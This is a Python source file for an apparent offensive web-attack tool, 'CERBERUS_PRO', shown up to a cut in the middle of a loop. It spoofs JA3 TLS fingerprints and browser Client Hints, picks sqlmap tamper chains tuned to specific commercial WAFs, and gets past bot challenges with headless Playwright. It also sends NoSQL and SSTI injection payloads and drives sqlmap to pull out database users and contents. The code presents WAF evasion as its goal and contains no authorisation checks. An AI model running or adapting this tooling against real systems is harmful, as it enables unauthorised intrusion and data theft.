import asyncio
import json
import random
import socket
import os
import re
import subprocess
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Callable, Dict, List, Optional, Tuple, Any
from abc import ABC, abstractmethod
from urllib.parse import parse_qs, urlparse


UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
]


class TLSFingerprintManager:
    """
    Master-level evasion (Evasión 5/5): Real JA3 TLS fingerprinting.
    Maps UA family to realistic TLS signatures that defeat JA3-based WAF detection.
    Integrates curl_cffi for TLS impersonation.
    """
    
    # Real JA3 fingerprints mapped by browser family
    # Format: "cipher_suites,extension_order,supported_curves,signature_algs"
    JA3_FINGERPRINTS = {
        "chrome": {
            "120": "4865,4866,4867,49195,49199,52393,52392,49196,49200,52394,49171,49172,156,157,47,53,10",
            "121": "4865,4866,4867,49195,49199,52393,52392,49196,49200,52394,49171,49172,156,157,47,53,10",
            "default": "4865,4866,4867,49195,49199,52393,52392,49196,49200,52394,49171,49172,156,157,47,53,10"
        },
        "firefox": {
            "121": "49195,49199,52393,52392,49196,49200,52394,49171,49172,156,157,10,47,53,27,28",
            "122": "49195,49199,52393,52392,49196,49200,52394,49171,49172,156,157,10,47,53,27,28",
            "default": "49195,49199,52393,52392,49196,49200,52394,49171,49172,156,157,10,47,53,27,28"
        },
        "safari": {
            "default": "4865,4866,4867,49195,49199,52393,52392,49196,49200,52394,49171,49172,156,157,10,47,53"
        },
        "edge": {
            "120": "4865,4866,4867,49195,49199,52393,52392,49196,49200,52394,49171,49172,156,157,47,53,10",
            "default": "4865,4866,4867,49195,49199,52393,52392,49196,49200,52394,49171,49172,156,157,47,53,10"
        }
    }
    
    # Sec-CH-UA header mapping (Client Hints) by family
    SEC_CH_UA_MAP = {
        "chrome": {
            "120": '"Google Chrome";v="120", "Not_A Brand";v="24", "Chromium";v="120"',
            "121": '"Google Chrome";v="121", "Not_A Brand";v="24", "Chromium";v="121"',
            "default": '"Google Chrome";v="120", "Not_A Brand";v="24", "Chromium";v="120"'
        },
        "firefox": {
            "121": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0)",
            "122": "Mozilla/5.0 (X11; Linux x86_64; rv:122.0)",
            "default": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0)"
        },
        "safari": {
            "default": '"Safari";v="17", "Version";v="17"'
        },
        "edge": {
            "120": '"Microsoft Edge";v="120", "Not_A Brand";v="24", "Chromium";v="120"',
            "default": '"Microsoft Edge";v="120", "Not_A Brand";v="24", "Chromium";v="120"'
        }
    }
    
    @staticmethod
    def get_ja3_fingerprint(ua_family: str, version: str = "default") -> str:
        """
        Retrieve real JA3 fingerprint for given UA family and version.
        Falls back to generic if not found.
        """
        family = ua_family.lower().strip()
        if family not in TLSFingerprintManager.JA3_FINGERPRINTS:
            return TLSFingerprintManager.JA3_FINGERPRINTS["chrome"]["default"]
        
        fam_map = TLSFingerprintManager.JA3_FINGERPRINTS[family]
        return fam_map.get(version, fam_map.get("default", TLSFingerprintManager.JA3_FINGERPRINTS["chrome"]["default"]))
    
    @staticmethod
    def get_sec_ch_ua(ua_family: str, version: str = "default") -> str:
        """
        Retrieve Sec-CH-UA header value for given UA family.
        Client Hints must match the actual User-Agent to avoid fingerprinting.
        """
        family = ua_family.lower().strip()
        if family not in TLSFingerprintManager.SEC_CH_UA_MAP:
            return TLSFingerprintManager.SEC_CH_UA_MAP["chrome"]["default"]
        
        fam_map = TLSFingerprintManager.SEC_CH_UA_MAP[family]
        return fam_map.get(version, fam_map.get("default", TLSFingerprintManager.SEC_CH_UA_MAP["chrome"]["default"]))
    
    @staticmethod
    def get_ua_family_from_string(ua_string: str) -> str:
        """
        Extract browser family from User-Agent string.
        """
        ua_lower = ua_string.lower()
        if "firefox" in ua_lower:
            return "firefox"
        elif "edg" in ua_lower:  # Edge must check before Chrome
            return "edge"
        elif "chrome" in ua_lower or "chromium" in ua_lower:
            return "chrome"
        elif "safari" in ua_lower:
            return "safari"
        return "chrome"  # default fallback


class DifferentialResponseValidator:
    """
    Extracción 5/5: Advanced WAF bypass detection.
    Detects when WAF has "cleaned" or suppressed responses.
    Validates extraction reliability by comparing response sizes and content.
    """
    
    def __init__(self):
        # Store baseline sizes for comparison
        self.baseline_sizes: Dict[str, int] = {}
        self.baseline_hashes: Dict[str, str] = {}
    
    def calculate_content_hash(self, content: str) -> str:
        """Calculate MD5 hash of content for comparison."""
        import hashlib
        return hashlib.md5(content.encode()).hexdigest()
    
    def register_baseline(self, key: str, content: str, size: Optional[int] = None) -> None:
        """Register baseline response for later comparison."""
        actual_size = size or len(content)
        content_hash = self.calculate_content_hash(content)
        self.baseline_sizes[key] = actual_size
        self.baseline_hashes[key] = content_hash
    
    def validate_extraction_reliability(self, 
                                       test_response: str, 
                                       control_response: str,
                                       extraction_key: str = "extraction") -> Dict[str, Any]:
        """
        Compare test response (with payload) vs control response (benign request).
        If size difference < 2%, response may have been cleaned by WAF.
        
        Returns dict with:
        - reliable: bool - is extraction trustworthy?
        - size_delta_percent: float - percentage size difference
        - evidence: str - explanation
        - force_oob: bool - should we force OOB/DNS extraction?
        """
        test_size = len(test_response.encode() if isinstance(test_response, str) else test_response)
        control_size = len(control_response.encode() if isinstance(control_response, str) else control_response)
        
        # Calculate size difference as percentage
        if control_size == 0:
            size_delta_percent = 0.0
        else:
            size_delta_percent = abs(test_size - control_size) / control_size * 100.0
        
        # If size difference is suspiciously small (<2%), response may be cleaned
        if size_delta_percent < 2.0:
            return {
                "reliable": False,
                "size_delta_percent": size_delta_percent,
                "evidence": f"Response size delta {size_delta_percent:.2f}% < 2% threshold; suspected WAF response cleaning",
                "force_oob": True,
                "extraction_key": extraction_key,
                "test_size": test_size,
                "control_size": control_size
            }
        
        # Check if response content hashes are too similar (possible templated responses)
        test_hash = self.calculate_content_hash(test_response)
        control_hash = self.calculate_content_hash(control_response)
        
        # If responses are identical or highly similar, extraction may be unreliable
        if test_hash == control_hash:
            return {
                "reliable": False,
                "size_delta_percent": size_delta_percent,
                "evidence": "Response content hashes identical; templated/cleaned response detected",
                "force_oob": True,
                "extraction_key": extraction_key,
                "test_size": test_size,
                "control_size": control_size
            }
        
        # Response looks reliable
        return {
            "reliable": True,
            "size_delta_percent": size_delta_percent,
            "evidence": f"Response size delta {size_delta_percent:.2f}% > 2%; extraction appears trustworthy",
            "force_oob": False,
            "extraction_key": extraction_key,
            "test_size": test_size,
            "control_size": control_size
        }
    
    def detect_waf_response_tampering(self, response: str) -> bool:
        """
        Detect common WAF tampering patterns:
        - Generic error messages
        - Reduced content size
        - Missing expected headers
        - Suspicious patterns (e.g., "blocked", "forbidden", generic 403)
        """
        response_lower = response.lower()
        
        tamper_indicators = [
            "access denied",
            "blocked by",
            "security policy",
            "not allowed",
            "request dropped",
            "403 forbidden",
            "rate limit",
            "please try again",
            "security event",
            "your connection has been dropped"
        ]
        
        for indicator in tamper_indicators:
            if indicator in response_lower:
                return True
        
        return False


class AttackEngine(ABC):
    """Base interface for pluggable attack engines."""

    @abstractmethod
    async def run(self, target: str, config: Dict[str, object], broadcast: Callable) -> "OmniResult":
        raise NotImplementedError


class MultiEngineRegistry:
    """Simple registry for runtime-discoverable engines."""

    def __init__(self) -> None:
        self._engines: Dict[str, AttackEngine] = {}

    def register(self, name: str, engine: AttackEngine) -> None:
        self._engines[name.lower()] = engine

    def get_engine(self, name: str) -> Optional[AttackEngine]:
        return self._engines.get(name.lower())


@dataclass
class OmniResult:
    vector: str
    vulnerable: bool
    evidence: List[str]
    command: List[str]
    exit_code: int


class SQLMapEngine(AttackEngine):
    """Engine wrapper for SQLMap vectors."""
    async def run(self, target: str, config: Dict[str, object], broadcast: Callable) -> OmniResult:
        # Integrated via run_sqlmap_vector in the main orchestrator
        return OmniResult(vector="SQLMAP", vulnerable=False, evidence=[], command=[], exit_code=0)

class NoSQLEngine(AttackEngine):
    """Engine for NoSQL injection patterns (MongoDB, Redis)."""
    async def run(self, target: str, config: Dict[str, object], broadcast: Callable) -> OmniResult:
        try:
            import httpx  # type: ignore
        except ImportError:
            return OmniResult(vector="NOSQL", vulnerable=False, evidence=["missing httpx"], command=[], exit_code=1)

        patterns = [
            {"name": "Mongo Auth Bypass", "payload": '{"$ne": null}'},
            {"name": "Redis CRLF", "payload": "\r\nINFO\r\n"},
        ]
        vulnerable = False
        evidence = []
        
        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            for p in patterns:
                await broadcast("CERBERUS_PRO", "INFO", f"NoSQL Probe: {p['name']}", {"target": target})
                try:
                    # Baseline: simple GET/POST fuzzing
                    resp = await client.post(target, json={"data": p["payload"]})
                    if resp.status_code == 200 and "redis_version" in resp.text:
                        vulnerable = True
                        evidence.append(f"Redis INFO leaked via {p['name']}")
                except Exception as e:
                    await broadcast("CERBERUS_PRO", "WARN", f"NoSQL Probe failed: {str(e)}", {})

        return OmniResult(vector="NOSQL", vulnerable=vulnerable, evidence=evidence, command=[], exit_code=0)

class TemplateExploitEngine(AttackEngine):
    """Engine for Server-Side Template Injection (SSTI)."""
    async def run(self, target: str, config: Dict[str, object], broadcast: Callable) -> OmniResult:
        try:
            import httpx  # type: ignore
        except ImportError:
            return OmniResult(vector="SSTI", vulnerable=False, evidence=["missing httpx"], command=[], exit_code=1)

        payloads = ["{{7*7}}", "${7*7}"]
        vulnerable = False
        evidence = []

        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            for p in payloads:
                await broadcast("CERBERUS_PRO", "INFO", f"SSTI Probe: {p}", {"target": target})
                try:
                    resp = await client.get(target, params={"test": p})
                    if "49" in resp.text and p not in resp.text:
                        vulnerable = True
                        evidence.append(f"SSTI confirmed: 7*7 evaluated to 49 with payload {p}")
                except Exception as e:
                    await broadcast("CERBERUS_PRO", "WARN", f"SSTI Probe failed: {str(e)}", {})

        return OmniResult(vector="SSTI", vulnerable=vulnerable, evidence=evidence, command=[], exit_code=0)

class AIIEEngine(AttackEngine):
    """Next-gen Autonomous Intelligent Injection Engine (Cerberus-AIIE)."""
    async def run(self, target: str, config: Dict[str, object], broadcast: Callable) -> OmniResult:
        try:
            from aiie_engine import CerberusAIIE
            engine = CerberusAIIE(broadcast)
            # Adapt config to engine requirements
            scan_config = {
                "params": config.get("params", {"id": "1"}),
                "profile": config.get("profile", "STEALTH")
            }
            res = await engine.detect_sqli(target, scan_config["params"])
            
            return OmniResult(
                vector="AIIE_SQLI",
                vulnerable=res.vulnerable,
                evidence=[res.evidence] if res.evidence else [],
                command=[f"AIIE_PAYLOAD: {res.payload}"] if res.payload else [],
                exit_code=0
            )
        except Exception as e:
            await broadcast("CERBERUS_PRO", "ERROR", f"AIIE Engine failed: {str(e)}", {})
            return OmniResult(vector="AIIE", vulnerable=False, evidence=[str(e)], command=[], exit_code=1)

engine_registry = MultiEngineRegistry()
engine_registry.register("sqlmap", SQLMapEngine())
engine_registry.register("nosql", NoSQLEngine())
engine_registry.register("ssti", TemplateExploitEngine())
engine_registry.register("aiie", AIIEEngine())


WAF_TAMPER_PRESETS = {
    "cloudflare": ["randomcase", "space2comment", "between", "charencode", "space2mysqldash"],
    "cloudflare_ml": ["apostrophemask", "equaltolike", "space2plus", "randomcomments", "versionedkeywords"],
    "akamai": ["charencode", "between", "space2comment", "greatest"],
    "imperva": ["charencode", "between", "space2comment", "greatest"],
    "aws": ["ifnull2ifisnull", "space2plus", "between", "randomcase"],
    "f5": ["ifnull2ifisnull", "space2mssqlhash", "between", "randomcase"],
    "general_strong": ["randomcase", "space2comment", "apostrophemask", "between", "charencode"]
}


class PolymorphicEvasionEngine:
    """Generate non-repeating tamper chains, traffic jitter, and WAF-specific patterns."""

    def __init__(self, waf_type: Optional[str] = None) -> None:
        self._last_chain: Optional[str] = None
        self.waf_type = waf_type.lower() if waf_type else None

    def generate_tamper_chain(self, size: int = 3) -> str:
        if self.waf_type and self.waf_type in WAF_TAMPER_PRESETS:
            preset = list(WAF_TAMPER_PRESETS[self.waf_type])
            # v4.1: Constant shuffle to avoid fingerprinting
            random.shuffle(preset)
            chain = ",".join(preset)
            self._last_chain = chain
            return chain

        size = max(1, min(size, len(TAMPER_POOL)))
        for _ in range(10):
            chain = ",".join(random.sample(TAMPER_POOL, size))
            if chain != self._last_chain:
                self._last_chain = chain
                return chain
        return chain

    def traffic_jitter(self, base_delay: float = 0.2) -> float:
        # v4.2: Dynamic jitter per invocation — smaller, randomized range to avoid WAF behavior detection
        # Recalculate jitter independently for each vector/run to break rhythmic patterns.
        return round(base_delay + random.uniform(0.1, 2.0), 2)

    def get_random_ua(self) -> str:
        return random.choice(UA_POOL)
    def get_random_ua_of_family(self, family: str) -> str:
        fam = str(family or "").lower()
        # Simple family matching: 'chrome', 'firefox', 'safari', 'edge'
        candidates = [u for u in UA_POOL if fam in u.lower()]
        if candidates:
            return random.choice(candidates)
        # fallback: return any UA not containing the family word
        fallback = [u for u in UA_POOL if fam not in u.lower()]
        if fallback:
            return random.choice(fallback)
        return random.choice(UA_POOL)


class BrowserStealth:
    """Uses Playwright to bypass JS challenges and Bot detection with human-like behavior."""
    
    def __init__(self):
        self.last_ua_family: Optional[str] = None
        self.tls_manager = TLSFingerprintManager()
    
    async def bypass_challenges(self, url: str, ua_family: Optional[str] = None) -> Dict[str, str]:
        """Returns cookies, headers, and TLS fingerprint after solving challenges."""
        # v4.1: Optimization - try lightweight check first with proper header sync
        try:
            import httpx
            chosen_ua = random.choice(UA_POOL)
            ua_fam = TLSFingerprintManager.get_ua_family_from_string(chosen_ua)
            sec_ch_ua = TLSFingerprintManager.get_sec_ch_ua(ua_fam)
            
            headers_req = {
                "User-Agent": chosen_ua,
                "Sec-CH-UA": sec_ch_ua,
                "Sec-CH-UA-Mobile": "?0",
                "Sec-CH-UA-Platform": '"Linux"'
            }
            
            async with httpx.AsyncClient(timeout=5.0, verify=False) as client:
                resp = await client.get(url, headers=headers_req)
                # If we get a 200 OK without "checking your browser" patterns, skip Playwright
                if resp.status_code == 200 and not any(x in resp.text.lower() for x in ["cf-chl", "checking your browser", "attention required"]):
                    return {}
        except Exception:
            pass

        try:
            from playwright.async_api import async_playwright
        except ImportError:
            return {}

        headers = {}
        try:
            async with async_playwright() as p:
                # If browsers were not downloaded yet, launching will throw and may spam logs.
                # Detect early and fallback silently.
                try:
                    import os
                    exe_path = getattr(p.chromium, "executable_path", None)
                    if isinstance(exe_path, str) and exe_path and not os.path.exists(exe_path):
                        # v4.2: Proactive self-healing during scan
                        await BrowserStealth.ensure_browsers()
                        if not os.path.exists(exe_path):
                            return {}
                except Exception:
                    # If we can't check, rely on launch try/except below.
                    pass

                # Use stealth-like configuration
                browser = await p.chromium.launch(headless=True)
                context = await browser.new_context(user_agent=random.choice(UA_POOL))
                page = await context.new_page()

                try:
                    # v4.1: Human-like interactions before challenge solving
                    await page.goto(url, wait_until="domcontentloaded", timeout=30000)

                    # Randomized scroll
                    await page.evaluate("window.scrollTo(0, document.body.scrollHeight / 2)")
                    await asyncio.sleep(random.uniform(0.5, 1.5))

                    # Mock mouse movement
                    await page.mouse.move(random.randint(0, 500), random.randint(0, 500))

                    await page.wait_for_load_state("networkidle")

                    cookies = await context.cookies()
                    cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
                    if cookie_str:
                        headers["Cookie"] = cookie_str
                    
                    # Extract TLS fingerprint from context (infer from UA used)
                    ua_used = random.choice(UA_POOL)
                    ua_family = TLSFingerprintManager.get_ua_family_from_string(ua_used)
                    ja3_fp = TLSFingerprintManager.get_ja3_fingerprint(ua_family)
                    sec_ch_ua = TLSFingerprintManager.get_sec_ch_ua(ua_family)
                    
                    # Return metadata with TLS info for downstream injection
                    headers["X-TLS-Fingerprint"] = ja3_fp
                    headers["X-UA-Family"] = ua_family
                    headers["Sec-CH-UA"] = sec_ch_ua
                    headers["Sec-CH-UA-Mobile"] = "?0"
                    headers["Sec-CH-UA-Platform"] = '"Linux"'
                    
                    self.last_ua_family = ua_family
                except Exception:
                    pass
                finally:
                    await browser.close()
        except Exception:
            # Playwright installed but browsers not downloaded (common on fresh installs).
            # Fallback cleanly: caller should proceed without cookies/headers.
            return {}
        
        return headers

    @staticmethod
    async def ensure_browsers() -> bool:
        """Helper to force install playwright browsers if missing."""
        try:
            import subprocess
            import sys
            # Check if chromium is already there
            from playwright.async_api import async_playwright
            async with async_playwright() as p:
                try:
                    browser = await p.chromium.launch(headless=True)
                    await browser.close()
                    return True
                except Exception:
                    # Try to install
                    subprocess.run([sys.executable, "-m", "playwright", "install", "chromium"], check=True)
                    return True
        except Exception:
            return False


async def calibration_waf_detect(url: str) -> str:
    """
    Lightweight pre-scan calibration:
    - Sends benign requests with jitter and random UA
    - Detects probable WAF from headers/body fingerprints
    - Returns preset key used by PolymorphicEvasionEngine
    """
    try:
        import httpx  # type: ignore
    except Exception:
        return "general_strong"

    hints = {
        "cloudflare": 0,
        "akamai": 0,
        "imperva": 0,
        "aws": 0,
    }
    methods = ["GET", "HEAD", "GET", "HEAD", "GET"]
    sample_count = random.randint(3, 5)

    async with httpx.AsyncClient(timeout=8.0, follow_redirects=True, verify=False) as client:
        for method in methods[:sample_count]:
            await asyncio.sleep(round(random.uniform(0.25, 1.2), 2))
            headers = {"User-Agent": random.choice(UA_POOL)}
            try:
                if method == "HEAD":
                    resp = await client.head(url, headers=headers)
                else:
                    resp = await client.get(url, headers=headers)
            except Exception:
                continue

            raw_headers = {k.lower(): v.lower() for k, v in resp.headers.items()}
            body = (resp.text or "").lower()[:3000] if method == "GET" else ""

            if "cf-ray" in raw_headers or "cloudflare" in raw_headers.get("server", ""):
                hints["cloudflare"] += 2
            if "ak_bmsc" in raw_headers.get("set-cookie", "") or "akamai" in raw_headers.get("server", ""):
                hints["akamai"] += 2
            if "incapsula" in raw_headers.get("x-cdn", "") or "imperva" in raw_headers.get("server", ""):
                hints["imperva"] += 2
            if "awselb" in raw_headers.get("server", "") or "x-amz-cf-id" in raw_headers:
                hints["aws"] += 2

            if re.search(r"(attention required|checking your browser|cf-chl)", body):
                hints["cloudflare"] += 1
            if re.search(r"(akamai|ak_bmsc|bot manager)", body):
                hints["akamai"] += 1
            if re.search(r"(incapsula|imperva)", body):
                hints["imperva"] += 1

    best = max(hints, key=lambda k: hints[k])
    if hints[best] <= 0:
        return "general_strong"
    return best


def infer_defense_signals(hostname: str, headers: Dict[str, str], body: str) -> List[str]:
    signals: List[str] = []
    host = str(hostname or "").lower()
    h = {str(k).lower(): str(v).lower() for k, v in (headers or {}).items()}
    b = str(body or "").lower()

    if ("cf-ray" in h) or ("cloudflare" in h.get("server", "")) or ("cf-cache-status" in h):
        signals.append("waf_cloudflare")
    if ("x-sucuri-id" in h) or ("x-sucuri-block" in h) or ("sucuri" in h.get("server", "")):
        signals.append("waf_sucuri")
    if ("x-cdn" in h and "incapsula" in h.get("x-cdn", "")) or ("imperva" in h.get("server", "")) or ("visid_incap" in h.get("set-cookie", "")):
        signals.append("waf_imperva")
    if ("ak_bmsc" in h.get("set-cookie", "")) or ("akamai" in h.get("server", "")):
        signals.append("waf_akamai")
    if ("wordfence" in b) or ("wfwaf" in b):
        signals.append("waf_wordfence")
    if any(token in b for token in [
        "g-recaptcha",
        "hcaptcha",
        "cf-turnstile",
        "attention required",
        "checking your browser",
        "captcha",
    ]):
        signals.append("captcha_or_challenge")
    if any(token in b for token in [
        "wp-content",
        "wp-json",
        "wp-login.php",
        "wordpress",
    ]) or host.startswith("wp.") or (".wp." in host):
        signals.append("wordpress_stack")

    # Dedup, preserve order
    deduped: List[str] = []
    for s in signals:
        if s not in deduped:
            deduped.append(s)
    return deduped


async def suspect_defended_target(url: str, timeout: float = 6.0) -> Dict[str, object]:
    """
    Fast pre-heuristic to decide if we should use defended-by-default strategy.
    """
    parsed = urlparse(str(url or ""))
    host = str(parsed.hostname or "")
    try:
        import httpx  # type: ignore
    except Exception:
        return {"suspected": False, "reasons": []}

    try:
        async with httpx.AsyncClient(timeout=timeout, follow_redirects=True, verify=False) as client:
            resp = await client.get(url, headers={"User-Agent": random.choice(UA_POOL)})
            body = (resp.text or "")[:8000]
            signals = infer_defense_signals(host, dict(resp.headers or {}), body)
            return {"suspected": bool(signals), "reasons": signals}
    except Exception:
        return {"suspected": False, "reasons": []}


TAMPER_POOL = [
    # Encoding (13)
    "base64encode", "hexencode", "chardoubleencode", "charencode",
    "charunicodeencode", "charunicodeescape", "htmlencode",
    "overlongutf8", "overlongutf8more", "percentage", "urlencode",
    "unicode", "utf8tooverlong",
    # Case manipulation (3)
    "randomcase", "uppercase", "lowercase",
    # Comment / Whitespace (10)
    "space2comment", "space2plus", "space2mssqlblank", "space2mssqlhash",
    "space2mysqldash", "space2hash", "space2morehash", "space2randomblank",
    "randomcomments", "multiplespaces",
    # String manipulation (7)
    "apostrophemask", "apostrophenullencode", "appendnullbyte",
    "commalesslimit", "commalessmid", "concat2concatws", "nullconnection",
    # Database specific (9)
    "between", "equaltolike", "greatest", "least",
    "ifnull2ifisnull", "ifnull2caseithennull",
    "modsecurityversioned", "modsecurityzeroversioned",
    "mysqlcomment",
    # Obfuscation (9)
    "symboliclogical", "unionalltounion", "unmagicquotes",
    "versionedkeywords", "versionedmorekeywords",
    "halfversionedmorekeywords", "informationschemacomment",
    "misunion", "schemasplit",
    # WAF bypass specific (10)
    "bluecoat", "dunfloor", "escapequotes", "plus2fnconcat",
    "plus2concat", "sp_password", "xforwardedfor",
    "sleep2getlock", "nonrecursivereplacement", "securesphere",
    # Advanced evasion (6)
    "decentities", "htmlencode", "luanginx",
    "ord2ascii", "substring2leftright", "scientific",
]  # 67 tampers — real sqlmap scripts

VECTOR_TECHNIQUES = {
    "UNION": "U",
    "ERROR": "E",
    "TIME": "T",
    "BOOLEAN": "B",
    "STACKED": "S",
    "INLINE": "Q",
}


async def run_sqlmap_vector(
    vector_name: str,
    base_cmd: List[str],
    broadcast_log: Callable[[str, str, str, Dict[str, object]], asyncio.Future],
    timeout_sec: int = 180,
) -> OmniResult:
    cmd = list(base_cmd)
    evidence: List[str] = []
    vulnerable = False
    parameter_markers: set[str] = set()
    runtime_signal_markers: set[str] = set()

    def _capture_parameter_markers(line_text: str) -> None:
        # Capture tested parameter hints so upper layers can assert real input coverage.
        text = str(line_text or "")
        for m in re.finditer(r"(?i)\b(?:parameter|par[aá]metro):\s*([a-z0-9_\-]+)\s*\((?:get|post|uri|cookie|header)\)", text):
            param = str(m.group(1) or "").strip()
            if param:
                parameter_markers.add(param)
        for m in re.finditer(r"(?i)\b(?:get|post|uri|cookie|header)\s+parameter\s+['\"]([^'\"]+)['\"]", text):
            param = str(m.group(1) or "").strip()
            if param:
                parameter_markers.add(param)
        # Localized/sqlmap variants (e.g. "parámetro 'id'" / "parameter 'id'")
        for m in re.finditer(r"(?i)\b(?:parameter|par[aá]metro)\s+['\"]([^'\"]+)['\"]", text):
            param = str(m.group(1) or "").strip()
            if param:
                parameter_markers.add(param)

    def _capture_runtime_signals(line_text: str) -> None:
        low = str(line_text or "").lower()
        if "captcha" in low:
            runtime_signal_markers.add("captcha")
        if ("waf/ips" in low) or ("protected by some kind of waf" in low):
            runtime_signal_markers.add("waf")
        # Explicit HTTP blocks commonly associated with WAF/IPS behavior.
        if (
            ("403" in low and ("forbidden" in low or "http error" in low))
            or ("access denied" in low)
            or ("request blocked" in low)
        ):
            # Treat 403 as immediate defensive signal; also treat like rate limiting
            runtime_signal_markers.add("waf")
            runtime_signal_markers.add("rate_limit")
            # If the 403 appears alongside evidence of a payload/test, escalate to active blocking marker
            if any(x in low for x in ("payload", "parameter:", "injection", "is vulnerable", "retrieved:")):
                runtime_signal_markers.add("waf_active_blocking")
        if (("got a 30" in low) or ("redirect" in low)) and ("login" in low):
            runtime_signal_markers.add("login_redirect")
        if ("unable to connect to the target url" in low) or ("connection timed out" in low):
            runtime_signal_markers.add("connection_instability")
        # Upstream instability should immediately reduce aggressiveness.
        if ("502" in low and ("bad gateway" in low or "http error" in low)) or ("504" in low and "gateway timeout" in low):
            # Treat 502 as defensive when observed after payloads — escalate to active blocking
            runtime_signal_markers.add("connection_instability")
            runtime_signal_markers.add("rate_limit")
            if any(x in low for x in ("payload", "parameter:", "injection", "is vulnerable", "retrieved:")):
                runtime_signal_markers.add("waf_active_blocking")
        if ("too many requests" in low) or ("http error codes detected during run" in low and "429" in low):
            runtime_signal_markers.add("rate_limit")

    async def _run_sync_fallback() -> OmniResult:
        nonlocal vulnerable
        await broadcast_log("CERBERUS_PRO", "WARN", f"[{vector_name}] iniciando subproceso nativo de escaneo...", {"vector": vector_name})
        try:
            popen_kwargs = {
                "stdout": subprocess.PIPE,
                "stderr": subprocess.STDOUT,
                "text": True,
                "bufsize": 1,
                "universal_newlines": True,
            }
            if os.name == "nt":
                popen_kwargs["creationflags"] = getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0)
            else:
                popen_kwargs["start_new_session"] = True

            proc = await asyncio.to_thread(subprocess.Popen, cmd, **popen_kwargs)
            await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] vector en ejecución", {"vector": vector_name, "cmd": cmd})

            started = datetime.now(timezone.utc)
            saw_end_marker = False
            while True:
                line = await asyncio.to_thread(proc.stdout.readline) if proc.stdout else ""
                if line:
                    text = str(line or "").strip()
                    if not text:
                        continue
                    low = text.lower()
                    _capture_parameter_markers(text)
                    _capture_runtime_signals(text)
                    if any(x in low for x in [
                        "is vulnerable",
                        "appears to be injectable",
                        "identified the following injection",
                        "resumed the following injection point",
                    ]):
                        vulnerable = True
                    if any(x in low for x in ["retrieved:", "current user:", "current database:", "database:"]):
                        if text not in evidence:
                            evidence.append(text)
                    if ("parameter:" in low) or ("payload:" in low) or ("type:" in low):
                        if text not in evidence:
                            evidence.append(text)
                    if any(x in low for x in [
                        "no forms found",
                        "all tested parameters do not appear to be injectable",
                        "you must provide at least one parameter",
                    ]):
                        if text not in evidence:
                            evidence.append(text)
                    # --- Filtro de Traducción y Limpieza ---
                    if any(art in text for art in ["___", "__H__", "{1.", "|_ -|", "[.]", "sqlmap.org", "legal disclaimer"]):
                        pass # Ignore ASCII art
                    else:
                        trans_text = text
                        # Complete lines or common phrases mapping
                        if "testing connection" in low: trans_text = "Validando conexión al vector objetivo..."
                        elif "heuristic (basic) test" in low: trans_text = "Iniciando análisis heurístico en parámetros..."
                        elif "it looks like the back-end" in low: trans_text = trans_text.replace("it looks like the back-end DBMS is", "El motor de Base de Datos es").replace("it looks like the back-end dbms is", "El motor devuelto es")
                        elif "fetching tables" in low: trans_text = "Extrayendo matriz de tablas..."
                        elif "fetching columns" in low: trans_text = "Extrayendo topología de columnas..."
                        elif "fetching entries" in low: trans_text = "Tirando datos de los registros..."
                        elif "resuming" in low and "dbms" in low: trans_text = trans_text.replace("resuming back-end DBMS", "Reanudando conexión con Motor Mapeado").replace("resuming back-end dbms", "Reconectando con")
                        elif "testing parameter" in low: trans_text = "Auditando comportamiento del parámetro..."
                        elif "is vulnerable" in low: trans_text = "[!!!] VULNERABILIDAD CRÍTICA CONFIRMADA [!!!]"
                        elif "resumed the following injection point" in low: trans_text = "Reanudando el análisis de inyección desde la caché:"
                        elif "the back-end dbms is" in low: trans_text = trans_text.replace("the back-end DBMS is", "Motor de Base de Datos identificado:").replace("the back-end dbms is", "Motor de DB:")
                        elif "fetching current user" in low: trans_text = "Obteniendo usuario actual de la Base de Datos..."
                        elif "retrieving the length of query output" in low: trans_text = "Calculando longitud del resultado de la consulta..."
                        elif "fetching current database" in low: trans_text = "Obteniendo nombre de la base de datos actual..."
                        elif "fetching database names" in low: trans_text = "Enumerando nombres de bases de datos..."
                        elif "fetching number of databases" in low: trans_text = "Calculando la cantidad de bases de datos..."
                        elif "fetching number of tables" in low: trans_text = "Calculando la cantidad de tablas para la base de datos..."
                        elif "you are advised to try a switch '--no-cast'" in low: trans_text = "[ADVERTENCIA] Problemas de recuperación continua. Cerberus intentará compensar."
                        elif "starting @" in low: trans_text = trans_text.replace("starting @", "Iniciando vector @")

                        # Partial substring replacements
                        trans_text = trans_text.replace("Parameter:", "Parámetro:")
                        trans_text = trans_text.replace("Type:", "Tipo:")
                        trans_text = trans_text.replace("Title:", "Título:")
                        trans_text = trans_text.replace("Payload:", "Carga Útil (Payload):")
                        trans_text = trans_text.replace("web server operating system:", "Sistema operativo del servidor web:")
                        trans_text = trans_text.replace("web application technology:", "Tecnología de la app web:")
                        trans_text = trans_text.replace("back-end DBMS:", "Motor backend DBMS:")
                        trans_text = trans_text.replace("resumed:", "Recuperado (Caché):")
                        trans_text = trans_text.replace("retrieved:", "Extraído:")
                        trans_text = trans_text.replace("current user:", "Usuario DBA logueado:")
                        trans_text = trans_text.replace("current database:", "Base de datos actual:")
                        trans_text = trans_text.replace("available databases", "Bases de datos disponibles")

                        await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] {trans_text}", {"vector": vector_name})
                    if ("[*] ending @" in low) or ("ending @" in low and "[*]" in low):
                        saw_end_marker = True
                        break
                else:
                    if proc.poll() is not None:
                        break
                    # no line yet; check timeout and keep loop alive
